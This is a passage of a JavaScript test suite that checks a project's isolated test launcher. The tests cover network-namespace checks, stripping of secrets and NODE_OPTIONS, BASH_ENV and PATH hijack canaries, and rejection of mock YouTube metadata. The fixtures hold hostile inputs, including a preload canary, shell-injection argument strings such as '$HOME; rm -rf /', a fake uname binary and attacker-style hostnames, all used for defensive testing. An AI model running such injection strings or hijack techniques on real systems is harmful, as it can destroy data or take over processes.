    // Regression Case 1: Missing interface evidence with disabled-state value "0" (UNKNOWN -> fail closed)
    writeFileSync(join(sysNetIpv6Dir, "disable_ipv6"), "0\n");
    rmSync(join(netDir, "if_inet6"), { force: true });
    const missingInet6EnabledProc = checkProcNetworkIsolation(tempProc);
    assert.equal(missingInet6EnabledProc.isolated, false, "Missing if_inet6 when sysctl is 0 must fail closed");
    assert.ok(missingInet6EnabledProc.reason.includes("ipv6_state_unknown"));
    assert.equal(getPlatformIpv6Status(tempProc), "UNKNOWN");

    // Regression Case 2: Missing interface evidence with missing sysctl (UNKNOWN -> fail closed)
    rmSync(join(sysNetIpv6Dir, "disable_ipv6"), { force: true });
    const missingSysctlProc = checkProcNetworkIsolation(tempProc);
    assert.equal(missingSysctlProc.isolated, false, "Missing sysctl must fail closed as UNKNOWN");
    assert.ok(missingSysctlProc.reason.includes("ipv6_state_unknown"));
    assert.equal(getPlatformIpv6Status(tempProc), "UNKNOWN");

    // Regression Case 3: Malformed disable-state value (UNKNOWN -> fail closed)
    writeFileSync(join(sysNetIpv6Dir, "disable_ipv6"), "malformed_value\n");
    const malformedSysctlProc = checkProcNetworkIsolation(tempProc);
    assert.equal(malformedSysctlProc.isolated, false, "Malformed sysctl must fail closed as UNKNOWN");
    assert.ok(malformedSysctlProc.reason.includes("ipv6_state_unknown"));
    assert.equal(getPlatformIpv6Status(tempProc), "UNKNOWN");

    // Regression Case 4: Unreadable sysctl (e.g. EISDIR / unreadable file error) (UNKNOWN -> fail closed)
    rmSync(join(sysNetIpv6Dir, "disable_ipv6"), { force: true });
    mkdirSync(join(sysNetIpv6Dir, "disable_ipv6")); // directory causes readFileSync to throw EISDIR
    const unreadableSysctlProc = checkProcNetworkIsolation(tempProc);
    assert.equal(unreadableSysctlProc.isolated, false, "Unreadable sysctl must fail closed as UNKNOWN");
    assert.ok(unreadableSysctlProc.reason.includes("ipv6_state_unknown"));
    assert.equal(getPlatformIpv6Status(tempProc), "UNKNOWN");
  } finally {
    rmSync(tempProc, { recursive: true, force: true });
  }

  // 3. buildSanitizedEnvironment excludes NODE_OPTIONS and secrets
  const dirtyEnv = {
    PATH: process.env.PATH,
    NODE_OPTIONS: "--require /malicious.cjs",
    NODE_PATH: "/untrusted/node/path",
    SECRET_API_KEY: "super_secret_token",
    AWS_SECRET_ACCESS_KEY: "aws_secret",
    npm_config_token: "npm_secret",
  };
  const cleanEnv = buildSanitizedEnvironment(dirtyEnv);
  assert.equal(cleanEnv.NODE_OPTIONS, undefined, "buildSanitizedEnvironment must strip NODE_OPTIONS");
  assert.equal(cleanEnv.NODE_PATH, undefined, "buildSanitizedEnvironment must strip NODE_PATH");
  assert.equal(cleanEnv.SECRET_API_KEY, undefined, "buildSanitizedEnvironment must strip secret keys");
  assert.equal(cleanEnv.AWS_SECRET_ACCESS_KEY, undefined, "buildSanitizedEnvironment must strip AWS secrets");
  assert.equal(cleanEnv.npm_config_token, undefined, "buildSanitizedEnvironment must strip npm variables");
  assert.equal(cleanEnv.NODE_ENV, "test");
  assert.equal(cleanEnv.LOLIXCO_TEST_ISOLATION, "1");
});

test("STAGE 1 AT-1.6g-probe: Probe error handling unit tests for verifyNetworkIsolationProbes", async () => {
  // Mock EventEmitter socket
  function createMockSocket() {
    const handlers = {};
    return {
      on(event, handler) {
        handlers[event] = handler;
        return this;
      },
      emit(event, ...args) {
        if (handlers[event]) handlers[event](...args);
      },
      destroy() {},
    };
  }

  // A1. Loopback failure must fail verification
  const loopbackFailProbe = await verifyNetworkIsolationProbes({
    createServerFn: () => {
      throw new Error("Server bind failure");
    },
  });
  assert.equal(loopbackFailProbe.verified, false, "Loopback bind failure must fail verification");
  assert.ok(loopbackFailProbe.reason.includes("loopback_verification_failed"));

  // A2. Synchronous programming exception in external connectFn must fail verification
  const syncExceptionProbe = await verifyNetworkIsolationProbes({
    connectFn: (port, host) => {
      if (host === "127.0.0.1") return net.connect(port, host);
      throw new Error("Synchronous socket creation bug");
    },
  });
  assert.equal(syncExceptionProbe.verified, false, "Synchronous exception in probe must fail verification");
  assert.ok(syncExceptionProbe.reason.includes("negative_ipv4_probe_failed"), "Reason must identify probe failure");

  // B. Unexpected socket error (e.g. ECONNREFUSED) must fail verification
  const connRefusedProbe = await verifyNetworkIsolationProbes({
    connectFn: (port, host) => {
      if (host === "127.0.0.1") return net.connect(port, host);
      const sock = createMockSocket();
      setImmediate(() => {
        const err = new Error("Connection refused");
        err.code = "ECONNREFUSED";
        sock.emit("error", err);
      });
      return sock;
    },
  });
  assert.equal(connRefusedProbe.verified, false, "ECONNREFUSED must fail verification (not kernel route denial)");

  // C. Ambiguous error (e.g. EINVAL or EADDRNOTAVAIL) must fail verification
  const einvalProbe = await verifyNetworkIsolationProbes({
    connectFn: (port, host) => {
      if (host === "127.0.0.1") return net.connect(port, host);
      const sock = createMockSocket();
      setImmediate(() => {
        const err = new Error("Invalid argument");
        err.code = "EINVAL";
        sock.emit("error", err);
      });
      return sock;
    },
  });
  assert.equal(einvalProbe.verified, false, "EINVAL must fail verification (ambiguous socket error)");

  // D. Connection timeout must fail verification
  const timeoutProbe = await verifyNetworkIsolationProbes({
    connectFn: (port, host) => {
      if (host === "127.0.0.1") return net.connect(port, host);
      return createMockSocket();
    },
    timeoutMs: 50,
  });
  assert.equal(timeoutProbe.verified, false, "Socket timeout must fail verification");
  assert.ok(timeoutProbe.reason.includes("ETIMEOUT"), "Must identify timeout");

  // E. Successful connection must fail verification
  const connectedProbe = await verifyNetworkIsolationProbes({
    connectFn: (port, host) => {
      if (host === "127.0.0.1") return net.connect(port, host);
      const sock = createMockSocket();
      setImmediate(() => sock.emit("connect"));
      return sock;
    },
  });
  assert.equal(connectedProbe.verified, false, "Outbound connection success must fail verification");
  assert.ok(connectedProbe.reason.includes("CONNECTED"), "Must identify connected socket");

  // F. Genuine kernel denial (ENETUNREACH) on both IPv4 and IPv6 succeeds
  const genuineProbe = await verifyNetworkIsolationProbes({
    connectFn: (port, host) => {
      if (host === "127.0.0.1") return net.connect(port, host);
      const sock = createMockSocket();
      setImmediate(() => {
        const err = new Error("Network is unreachable");
        err.code = "ENETUNREACH";
        sock.emit("error", err);
      });
      return sock;
    },
  });
  assert.equal(genuineProbe.verified, true, "Genuine ENETUNREACH must pass probe verification");

  // G. Unexpected IPv6 probe failure (IPv4 receives ENETUNREACH, but IPv6 probe receives ECONNREFUSED)
  const ipv6UnexpectedProbe = await verifyNetworkIsolationProbes({
    getIpv6StatusFn: () => "VERIFIED_ENABLED",
    connectFn: (port, host) => {
      if (host === "127.0.0.1") return net.connect(port, host);
      const sock = createMockSocket();
      setImmediate(() => {
        if (host === "198.51.100.1") {
          const err = new Error("Network is unreachable");
          err.code = "ENETUNREACH";
          sock.emit("error", err);
        } else {
          const err = new Error("Connection refused");
          err.code = "ECONNREFUSED";
          sock.emit("error", err);
        }
      });
      return sock;
    },
  });
  assert.equal(ipv6UnexpectedProbe.verified, false, "Unexpected IPv6 probe failure must fail verification");
  assert.ok(ipv6UnexpectedProbe.reason.includes("negative_ipv6_probe_failed"), "Must identify IPv6 probe failure");
});

test("STAGE 1 AT-1.6h: Real launcher execution - NODE_OPTIONS preload exclusion through trusted shell entry point", () => {
  const launcherPath = resolve(projectRoot, "scripts/run-isolated-tests.sh");
  assert.ok(existsSync(launcherPath), "Launcher scripts/run-isolated-tests.sh must exist");

  const canaryTempDir = mkdtempSync(join(tmpdir(), "lolixco-real-canary-"));
  const canaryMarker = join(canaryTempDir, "canary_executed.marker");
  const canaryScript = join(canaryTempDir, "malicious_preload.cjs");
  const miniTestScript = join(canaryTempDir, "mini_canary_test.mjs");

  try {
    writeFileSync(canaryScript, `require("node:fs").writeFileSync(${JSON.stringify(canaryMarker)}, "PWNED");\n`);

    writeFileSync(
      miniTestScript,
      `
      import assert from "node:assert/strict";
      assert.equal(process.env.NODE_OPTIONS, undefined, "NODE_OPTIONS must be stripped in test runner");
      assert.equal(process.env.LOLIXCO_CANARY_SECRET, undefined, "Workstation credentials must be stripped");
      assert.equal(process.env.LOLIXCO_TEST_MODE, "1", "LOLIXCO_TEST_MODE must be set");
      console.log("CANARY_TEST_SUITE_PASSED_CLEANLY");
      `
    );

    // Launch the actual supported entry point scripts/run-isolated-tests.sh with unintercepted rawSpawnSync
    // so NODE_OPTIONS reaches the launcher directly without prior JS stripping
    const dirtyEnv = {
      ...process.env,
      NODE_OPTIONS: `--require ${canaryScript}`,
      LOLIXCO_CANARY_SECRET: "super_secret_credentials_to_strip",
    };

    const launcherChild = rawSpawnSync("/bin/bash", [launcherPath, miniTestScript], {
      cwd: projectRoot,
      encoding: "utf-8",
      env: dirtyEnv,
    });

    assert.equal(launcherChild.status, 0, `Launcher child exited with error: ${launcherChild.stderr}`);
    assert.ok(
      launcherChild.stdout.includes("CANARY_TEST_SUITE_PASSED_CLEANLY"),
      "Intended test suite must execute and pass cleanly"
    );
    assert.equal(
      existsSync(canaryMarker),
      false,
      "Canary marker MUST NOT be created: inherited NODE_OPTIONS preload hooks must never execute"
    );
  } finally {
    rmSync(canaryTempDir, { recursive: true, force: true });
  }
});

test("STAGE 1 AT-1.6h-bash: Real launcher execution - BASH_ENV startup hook exclusion and rejection", () => {
  const launcherPath = resolve(projectRoot, "scripts/run-isolated-tests.sh");
  const canaryTempDir = mkdtempSync(join(tmpdir(), "lolixco-bash-canary-"));
  const canaryMarker = join(canaryTempDir, "bash_canary_executed.marker");
  const canaryScript = join(canaryTempDir, "malicious_bash_env.sh");
  const miniTestScript = join(canaryTempDir, "mini_test.mjs");

  try {
    writeFileSync(canaryScript, `touch "${canaryMarker}"\n`);
    writeFileSync(miniTestScript, `console.log("MINI_TEST_PASSED");\n`);

    // 1. Direct invocation with inherited BASH_ENV:
    // Demonstrates that non-interactive Bash executes BASH_ENV before script line 1 starts,
    // and that the launcher detects this and aborts fail-closed with exit code 1.
    const directChild = rawSpawnSync("/bin/bash", [launcherPath, miniTestScript], {
      cwd: projectRoot,
      encoding: "utf-8",
      env: {
        ...process.env,
        BASH_ENV: canaryScript,
      },
    });

    assert.notEqual(directChild.status, 0, "Direct invocation with inherited BASH_ENV must fail closed");
    assert.ok(
      directChild.stderr.includes("Inherited shell startup hook detected (BASH_ENV/ENV)"),
      "Must identify shell startup hook violation"
    );
    // Explicitly assert that the direct invocation caused the canary to execute before the script could abort
    assert.equal(
      existsSync(canaryMarker),
      true,
      "Direct invocation demonstrates that inherited BASH_ENV executes before script starts (why trusted parent is required)"
    );

    // Reset canary marker before verifying the trusted entry point
    rmSync(canaryMarker, { force: true });
    assert.equal(existsSync(canaryMarker), false, "Canary marker must be cleared prior to trusted launch test");

    // 2. Invocation via the supported trusted entry point purges BASH_ENV before Bash starts
    const trustedChild = rawSpawnSync("/usr/bin/env", [
      "-i",
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      `HOME=${process.env.HOME || "/tmp"}`,
      "/bin/bash",
      "--noprofile",
      "--norc",
      launcherPath,
      miniTestScript,
    ], {
      cwd: projectRoot,
      encoding: "utf-8",
      env: {
        ...process.env,
        BASH_ENV: canaryScript,
      },
    });

    assert.equal(trustedChild.status, 0, `Trusted launcher failed: ${trustedChild.stderr}`);
    assert.ok(trustedChild.stdout.includes("MINI_TEST_PASSED"), "Trusted launcher must run test suite");
    assert.equal(
      existsSync(canaryMarker),
      false,
      "Canary marker MUST NOT be created under trusted sanitized invocation: BASH_ENV was purged before Bash started"
    );
  } finally {
    rmSync(canaryTempDir, { recursive: true, force: true });
  }
});

test("STAGE 1 AT-1.6h-path: Real launcher execution - Hostile PATH executable resolution canary exclusion", () => {
  const launcherPath = resolve(projectRoot, "scripts/run-isolated-tests.sh");
  const fakeBinDir = mkdtempSync(join(tmpdir(), "lolixco-fake-bin-"));
  const fakeMarker = join(fakeBinDir, "fake_uname_executed.marker");
  const fakeUname = join(fakeBinDir, "uname");
  const miniTestScript = join(fakeBinDir, "mini_test.mjs");

  try {
    // Malicious fake uname executable in attacker-controlled PATH
    writeFileSync(fakeUname, `#!/bin/sh\ntouch "${fakeMarker}"\nexit 1\n`);
    fs.chmodSync(fakeUname, 0o755);
    writeFileSync(miniTestScript, `console.log("PATH_TEST_PASSED");\n`);

    // Launch with attacker-controlled directory prepended to PATH using unintercepted rawSpawnSync
    const launcherChild = rawSpawnSync("/bin/bash", [launcherPath, miniTestScript], {
      cwd: projectRoot,
      encoding: "utf-8",
      env: {
        ...process.env,
        PATH: `${fakeBinDir}:${process.env.PATH}`,
      },
    });

    assert.equal(launcherChild.status, 0, `Launcher failed: ${launcherChild.stderr}`);
    assert.equal(
      existsSync(fakeMarker),
      false,
      "Fake executable in inherited PATH must NEVER execute: fixed trusted PATH policy must prevail"
    );
    assert.ok(launcherChild.stdout.includes("PATH_TEST_PASSED"), "Test must run with trusted utilities");
  } finally {
    rmSync(fakeBinDir, { recursive: true, force: true });
  }
});

test("STAGE 1 AT-1.6i: Real launcher execution - Literal argument preservation through positional parameters", () => {
  const launcherPath = resolve(projectRoot, "scripts/run-isolated-tests.sh");
  const injectionMarker = join(tmpdir(), `shell-injection-marker-${Date.now()}.txt`);

  try {
    const maliciousArg1 = `test; touch ${injectionMarker}; echo injected`;
    const maliciousArg2 = "$HOME; rm -rf /";

    // 1. Direct argument preservation through already-isolated branch
    const launcherChild = rawSpawnSync("/bin/bash", [
      launcherPath,
      "--print-args",
      maliciousArg1,
      maliciousArg2,
    ], {
      cwd: projectRoot,
      encoding: "utf-8",
    });

    assert.equal(launcherChild.status, 0, `Launcher failed: ${launcherChild.stderr}`);
    assert.equal(
      existsSync(injectionMarker),
      false,
      "Shell metacharacters in arguments must NOT be evaluated by shell launcher"
    );
    assert.equal(
      launcherChild.stderr.includes("[LOLIXCO LAUNCHER] Establishing new isolated kernel network namespace"),
      false,
      "Already-isolated execution must NOT trigger namespace creation branch"
    );

    const match = launcherChild.stdout.match(/RECEIVED_RAW_ARGS:(.+)/);
    assert.ok(match, "Launcher must pass literal arguments to test runner");
    const receivedArgs = JSON.parse(match[1]);
    assert.equal(receivedArgs[1], maliciousArg1, "Argument 1 must be preserved literally in already-isolated branch");
    assert.equal(receivedArgs[2], maliciousArg2, "Argument 2 must be preserved literally in already-isolated branch");

    // 2. Argument preservation through the namespace-creation shell path (scripts/run-isolated-tests.sh:165-183)
    // Uses a controlled harness in a user+net namespace where veth interfaces and routes are created natively,
    // establishing genuine unisolated /proc/net/dev and /proc/net/route state.
    // The harness fails immediately on any setup error, verifies the pre-creation state,
    // and asserts that the namespace-creation branch actually executed.
    const harnessChild = rawSpawnSync("/usr/bin/unshare", [
      "-rn",
      "/bin/bash",
      "-c",
      `
        set -euo pipefail
        # Setup simulated unisolated state with virtual network interface and routing entry
        ip link add name eth0 type veth peer name veth1
        ip link set eth0 up
        ip route add 192.168.1.0/24 dev eth0

        # Verify that the unisolated pre-creation state is visible in /proc/net before launching:
        if ! grep -q "eth0" /proc/net/dev; then
          echo "[HARNESS FATAL] Simulated eth0 device not present in /proc/net/dev" >&2
          exit 2
        fi
        if ! grep -q "eth0" /proc/net/route; then
          echo "[HARNESS FATAL] Simulated external route not present in /proc/net/route" >&2
          exit 3
        fi
        echo "[HARNESS PRE-STATE VERIFIED] /proc/net/dev and route contain eth0" >&2

        # Execute launcher - must take the unshare -rn creation branch because it is not yet isolated
        exec "${launcherPath}" "$@"
      `,
      "creation-harness",
      "--print-args",
      maliciousArg1,
      maliciousArg2,
    ], {
      cwd: projectRoot,
      encoding: "utf-8",
    });

    assert.equal(harnessChild.status, 0, `Namespace-creation harness failed: ${harnessChild.stderr}`);
    assert.ok(
      harnessChild.stderr.includes("[HARNESS PRE-STATE VERIFIED]"),
      "Harness pre-creation state verification must pass"
    );
    assert.ok(
      !harnessChild.stderr.includes("[HARNESS FATAL]"),
      "Harness setup must not encounter any errors"
    );
    // Affirmative assertion that the namespace-creation branch actually ran:
    assert.ok(
      harnessChild.stderr.includes("[LOLIXCO LAUNCHER] Establishing new isolated kernel network namespace via unshare..."),
      "Must prove that the unshare -rn namespace-creation branch actually ran"
    );
    assert.equal(
      existsSync(injectionMarker),
      false,
      "Shell metacharacters must not be evaluated during unshare -rn namespace creation"
    );

    const creationMatch = harnessChild.stdout.match(/RECEIVED_RAW_ARGS:(.+)/);
    assert.ok(creationMatch, "Namespace-creation branch must pass literal arguments to test runner");
    const creationArgs = JSON.parse(creationMatch[1]);
    assert.equal(creationArgs[1], maliciousArg1, "Argument 1 must be preserved literally through unshare -rn creation");
    assert.equal(creationArgs[2], maliciousArg2, "Argument 2 must be preserved literally through unshare -rn creation");
  } finally {
    if (existsSync(injectionMarker)) unlinkSync(injectionMarker);
  }
});

test("STAGE 1 AT-1.6j: Unit helper test - Unsupported platform and unisolated host rejection", () => {
  const launcherPath = resolve(projectRoot, "scripts/run-isolated-tests.sh");
  const tempDir = mkdtempSync(join(tmpdir(), "lolixco-platform-test-"));
  const fakeDarwinUname = join(tempDir, "uname");

  try {
    // 1. Unit helper test: platform-check contract validation (simulated non-Linux uname rejection)
    writeFileSync(fakeDarwinUname, "#!/bin/sh\necho Darwin\n");
    fs.chmodSync(fakeDarwinUname, 0o755);

    const platformChild = rawSpawnSync("/bin/bash", ["-c", `
      export PATH="${tempDir}:/usr/bin:/bin"
      # Unit helper verifying the exact platform-check conditional logic used in launcher:
      if [ "$(${tempDir}/uname -s)" != "Linux" ]; then
        echo "[LOLIXCO SECURITY FATAL] Kernel network isolation requires Linux (detected: Darwin)." >&2
        exit 1
      fi
    `]);

    assert.equal(platformChild.status, 1, "Simulated non-Linux platform helper must exit 1");
    assert.ok(
      platformChild.stderr.includes("Kernel network isolation requires Linux"),
      "Must identify kernel network isolation requires Linux"
    );

    // 2. Direct unisolated Node invocation of scripts/run-isolated-tests.mjs with invalid boundary must fail closed
    const procCheck = checkProcNetworkIsolation("/nonexistent/boundary");
    assert.equal(procCheck.isolated, false, "Invalid boundary must report isolated: false");

    // 3. Verify checkProcNetworkIsolation Darwin platform rejection
    const originalPlatform = process.platform;
    try {
      Object.defineProperty(process, "platform", { value: "darwin", configurable: true });
      const darwinCheck = checkProcNetworkIsolation();
      assert.equal(darwinCheck.isolated, false, "Darwin platform must be rejected fail-closed");
      assert.ok(darwinCheck.reason.includes("unsupported_platform"), "Must identify unsupported_platform");
    } finally {
      Object.defineProperty(process, "platform", { value: originalPlatform, configurable: true });
    }
  } finally {
    rmSync(tempDir, { recursive: true, force: true });
  }
});

test("STAGE 1 AT-1.6d: Named HTTP/HTTPS imports and syncBuiltinESMExports interception", async () => {
  // 1. Dynamic import of named exports from node:http
  const { request: namedHttpRequest, get: namedHttpGet, ClientRequest: NamedClientRequest } = await import("node:http");

  assert.throws(
    () => {
      namedHttpRequest("http://example.com/api");
    },
    (err) => {
      assert.equal(err.code, "ENETWORK_BLOCKED_TEST_MODE");
      assert.ok(err.message.includes("Outbound HTTP request"));
      return true;
    },
    "Named export 'request' from node:http must be intercepted"
  );

  assert.throws(
    () => {
      namedHttpGet("http://example.com/api");
    },
    (err) => {
      assert.equal(err.code, "ENETWORK_BLOCKED_TEST_MODE");
      assert.ok(err.message.includes("Outbound HTTP request"));
      return true;
    },
    "Named export 'get' from node:http must be intercepted"
  );

  assert.throws(
    () => {
      new NamedClientRequest("http://example.com/api");
    },
    (err) => {
      assert.equal(err.code, "ENETWORK_BLOCKED_TEST_MODE");
      assert.ok(err.message.includes("Outbound HTTP ClientRequest"));
      return true;
    },
    "Named export 'ClientRequest' from node:http must be intercepted"
  );

  // 2. Dynamic import of named exports from node:https
  const { request: namedHttpsRequest, get: namedHttpsGet } = await import("node:https");

  assert.throws(
    () => {
      namedHttpsRequest("https://www.googleapis.com/youtube/v3/videos");
    },
    (err) => {
      assert.equal(err.code, "ENETWORK_BLOCKED_TEST_MODE");
      assert.ok(err.message.includes("Outbound HTTPS request"));
      return true;
    },
    "Named export 'request' from node:https must be intercepted"
  );

  assert.throws(
    () => {
      namedHttpsGet("https://www.googleapis.com/youtube/v3/videos");
    },
    (err) => {
      assert.equal(err.code, "ENETWORK_BLOCKED_TEST_MODE");
      assert.ok(err.message.includes("Outbound HTTPS request"));
      return true;
    },
    "Named export 'get' from node:https must be intercepted"
  );

  // 3. CommonJS named exports and require('node:http')
  const req = createRequire(import.meta.url);
  const cjsHttp = req("node:http");
  assert.throws(
    () => {
      cjsHttp.request("http://example.com/api");
    },
    (err) => {
      assert.equal(err.code, "ENETWORK_BLOCKED_TEST_MODE");
      return true;
    },
    "CommonJS require('node:http').request must be intercepted"
  );

  const { request: cjsDestructuredRequest } = req("node:http");
  assert.throws(
    () => {
      cjsDestructuredRequest("http://example.com/api");
    },
    (err) => {
      assert.equal(err.code, "ENETWORK_BLOCKED_TEST_MODE");
      return true;
    },
    "CommonJS destructured { request } must be intercepted"
  );

  const cjsHttps = req("node:https");
  assert.throws(
    () => {
      cjsHttps.request("https://example.com/api");
    },
    (err) => {
      assert.equal(err.code, "ENETWORK_BLOCKED_TEST_MODE");
      return true;
    },
    "CommonJS require('node:https').request must be intercepted"
  );
});

test("STAGE 1 AT-1.7: Parsed hostname loopback validation correctly distinguishes loopback from external hosts", () => {
  assert.equal(isAllowedLoopback("http://localhost:3000/api"), true);
  assert.equal(isAllowedLoopback("http://127.0.0.1:8080/status"), true);
  assert.equal(isAllowedLoopback("http://[::1]:9000/metrics"), true);
  assert.equal(isAllowedLoopback("localhost"), true);
  assert.equal(isAllowedLoopback("127.0.0.1"), true);
  assert.equal(isAllowedLoopback("::1"), true);

  assert.equal(isAllowedLoopback("http://localhost.attacker.com/evil"), false);
  assert.equal(isAllowedLoopback("http://127.0.0.1.attacker.com/evil"), false);
  assert.equal(isAllowedLoopback("http://localhost-fake.com"), false);
  assert.equal(isAllowedLoopback("https://googleapis.com"), false);
  assert.equal(isAllowedLoopback(""), false);
  assert.equal(isAllowedLoopback(null), false);
});

test("STAGE 1 AT-1.8: fetchYouTubeVideoMetadata fails closed without mock transport or mock database", async () => {
  const failResult = await fetchYouTubeVideoMetadata(["dummyId0001"], {
    apiKey: "AIzaSyFakeKeyForTestVerificationOnly",
    mockMode: false,
  });

  assert.equal(failResult.items.length, 0, "Must return zero items when unmocked");
  assert.ok(failResult.errors.length > 0, "Must return structured error");
  assert.ok(
    failResult.errors.some((e) => e.includes("FAIL-CLOSED TEST ISOLATION") || e.includes("FAIL-CLOSED TEST NETWORK ISOLATION")),
    "Error message must clearly identify fail-closed test isolation"
  );
});

test("STAGE 1 AT-1.8b: Standalone test-mode YouTube API protection without test bootstrap", () => {
  // Spawn a clean Node process WITHOUT --import ./tests/register-ts.mjs
  // Pass LOLIXCO_TEST_MODE=1 to prove standalone rejection before fetch executes
  const inlineScript = `
    import { fetchYouTubeVideoMetadata } from './scripts/youtube-api.mjs';

    // 1. Unmocked call through default transport must fail closed before fetch executes
    const unmockedResult = await fetchYouTubeVideoMetadata(['dummyId0001'], {
      apiKey: 'AIzaSyFakeStandaloneKeyForTestVerificationOnly',
      mockMode: false,
    });

    if (unmockedResult.items.length !== 0) {
      console.error('FAILED: unmocked items should be 0, got:', unmockedResult.items.length);
      process.exit(1);
    }
    const hasFailClosedError = unmockedResult.errors.some(e =>
      e.includes('FAIL-CLOSED TEST ISOLATION: Unmocked default-network YouTube API calls are strictly prohibited')
    );
    if (!hasFailClosedError) {
      console.error('FAILED: expected fail-closed error, got:', unmockedResult.errors);
      process.exit(2);
    }

    // 2. Deterministic mock transport in standalone mode must work and produce synthetic provenance
    const mockResult = await fetchYouTubeVideoMetadata(['dummyId0001'], {
      apiKey: 'AIzaSyFakeStandaloneKeyForTestVerificationOnly',
      mockMode: false,
      fetchTransport: async () => ({
        ok: true,
        status: 200,
        json: async () => ({
          items: [{
            id: 'dummyId0001',
            snippet: {
              title: 'Standalone Mock Video',
              description: '#action #anime',
              channelId: 'UC_mock',
              channelTitle: 'Mock Creator',
              publishedAt: '2026-01-15T12:00:00Z',
              thumbnails: { high: { url: 'https://i.ytimg.com/vi/dummyId0001/hqdefault.jpg' } }
            },
            contentDetails: { duration: 'PT30S' },
            status: { embeddable: true, privacyStatus: 'public' }
          }]
        })
      })
    });

    if (mockResult.items.length !== 1 || mockResult.items[0].isMock !== true || mockResult.items[0].provenance !== 'synthetic_mock') {
      console.error('FAILED: mockResult invalid:', mockResult);
      process.exit(3);
    }

    console.log('STANDALONE_YOUTUBE_ISOLATION_PASSED');
  `;

  const child = spawnSync(
    process.execPath,
    ["--input-type=module", "-e", inlineScript],
    {
      cwd: projectRoot,
      env: {
        PATH: process.env.PATH,
        LOLIXCO_TEST_MODE: "1",
        // Note: No register-ts.mjs imported, so globalThis.fetch is native Node.js fetch!
      },
      encoding: "utf-8",
    }
  );

  assert.equal(child.status, 0, `Standalone process failed: ${child.stderr}\n${child.stdout}`);
  assert.ok(
    child.stdout.includes("STANDALONE_YOUTUBE_ISOLATION_PASSED"),
    "Standalone process must verify YouTube API fail-closed protection"
  );
});

test("STAGE 1 AT-1.9: Injected transport forces synthetic provenance and cannot be laundered into production", async () => {
  const syntheticId = "injectdTr01"; // Exactly 11 characters
  let transportCalled = false;

  const mockTransport = async (url) => {
    transportCalled = true;
    assert.ok(String(url).includes("googleapis.com/youtube/v3/videos"));
    return {
      ok: true,
      status: 200,
      json: async () => ({
        items: [
          {
            id: syntheticId,
            snippet: {
              title: "Simulated Official Video Title",
              description: "High quality test #anime",
              channelId: "UC_transport_channel",
              channelTitle: "Transport Studio",
              publishedAt: "2026-01-01T00:00:00Z",
              thumbnails: { high: { url: `https://i.ytimg.com/vi/${syntheticId}/hqdefault.jpg` } },
            },
            contentDetails: { duration: "PT45S" },
            status: { embeddable: true, privacyStatus: "public" },
          },
        ],
      }),
    };
  };

  const result = await fetchYouTubeVideoMetadata([syntheticId], {
    apiKey: "AIzaSyFakeKeyForTransportTest",
    mockMode: false,
    fetchTransport: mockTransport,
  });

  assert.equal(transportCalled, true, "Injected mock transport must be invoked");
  assert.equal(result.items.length, 1, "Must return 1 parsed item");

  const item = result.items[0];
  assert.equal(item.isMock, true, "Injected transport must force isMock: true");
  assert.equal(item.provenance, "synthetic_mock", "Injected transport must force provenance: 'synthetic_mock'");
  assert.equal(item.syntheticOrigin, "injected_fetch_transport", "syntheticOrigin must identify injected transport");

  const tempDir = createDisposableTempDir("lolixco-prov-");
  const tempAuditPath = join(tempDir, "audit.json");
  const tempCatalogPath = join(tempDir, "edits.ts");

  try {
    const auditData = {
      version: "1.0.0",
      generatedAt: "2026-01-01T00:00:00Z",
      items: [
        {
          canonicalVideoId: syntheticId,
          canonicalUrl: `https://www.youtube.com/watch?v=${syntheticId}`,
          category: "Anime",
          fandomIds: ["jujutsu-kaisen"],
          format: "video",
          contentReviewStatus: "embed_eligible",
          isMock: item.isMock,
          provenance: item.provenance,
          syntheticOrigin: item.syntheticOrigin,
          metadataFetchStatus: "fetched",
          metadata: item,
        },
      ],
    };
    writeFileSync(tempAuditPath, JSON.stringify(auditData, null, 2), "utf-8");

    const approveResult = await approveReviewItem(syntheticId, {
      auditFilePath: tempAuditPath,
      format: "video",
    });
    assert.equal(approveResult.success, false, "Owner approval must fail closed for injected transport record");

    const compileResult = await compileYouTubeCatalog({
      auditFilePath: tempAuditPath,
      outputPath: tempCatalogPath,
      dryRun: false,
    });
    assert.equal(compileResult.success, false, "Catalog publication must reject injected transport record");
    assert.equal(existsSync(tempCatalogPath), false, "Output catalog file must not be written");
  } finally {
    rmSync(tempDir, { recursive: true, force: true });
  }
});

test("STAGE 1 AT-1.9b: Global fetch replacement forces synthetic provenance and cannot be laundered into production", async () => {
  const globalMockId = "globMockVi1";
  const originalFetch = globalThis.fetch;

  try {
    globalThis.fetch = async (url) => {
      return {
        ok: true,
        status: 200,
        json: async () => ({
          items: [
            {
              id: globalMockId,
              snippet: {
                title: "Genuine Looking Title from Global Stub",
                description: "Realistic description #anime",
                channelId: "UC_global_stub_creator",
                channelTitle: "Official Studio Channel",
                publishedAt: "2026-01-01T00:00:00Z",
                thumbnails: { high: { url: `https://i.ytimg.com/vi/${globalMockId}/hqdefault.jpg` } },
              },
              contentDetails: { duration: "PT1M" },
              status: { embeddable: true, privacyStatus: "public" },
            },
          ],
        }),
      };
    };

    const result = await fetchYouTubeVideoMetadata([globalMockId], {
      apiKey: "AIzaSyTestKeyForGlobalStub",
      mockMode: false,
    });

    assert.equal(result.items.length, 1);
    const item = result.items[0];

    assert.equal(item.isMock, true, "Replaced global fetch must produce isMock: true under test isolation");
    assert.equal(item.provenance, "synthetic_mock", "Replaced global fetch cannot launder provenance to youtube_data_api_v3");
    assert.equal(item.syntheticOrigin, "test_environment_mock", "Synthetic origin must be stamped as test_environment_mock");

    const tempDir = createDisposableTempDir("lolixco-globmock-");
    const tempAuditPath = join(tempDir, "audit.json");
    const tempCatalogPath = join(tempDir, "edits.ts");

    try {
      const auditData = {
        version: "1.0.0",
        generatedAt: "2026-01-01T00:00:00Z",
        items: [
          {
            canonicalVideoId: globalMockId,
            canonicalUrl: `https://www.youtube.com/watch?v=${globalMockId}`,
            category: "Anime",
            fandomIds: ["jujutsu-kaisen"],
            format: "video",
            contentReviewStatus: "embed_eligible",
            isMock: item.isMock,
            provenance: item.provenance,
            syntheticOrigin: item.syntheticOrigin,
            metadataFetchStatus: "fetched",
            metadata: item,
          },
        ],
      };
      writeFileSync(tempAuditPath, JSON.stringify(auditData, null, 2), "utf-8");

      const approveResult = await approveReviewItem(globalMockId, {
        auditFilePath: tempAuditPath,
        format: "video",
      });
      assert.equal(approveResult.success, false, "Owner approval must reject synthetic mock metadata from global fetch replacement");

      const compileResult = await compileYouTubeCatalog({
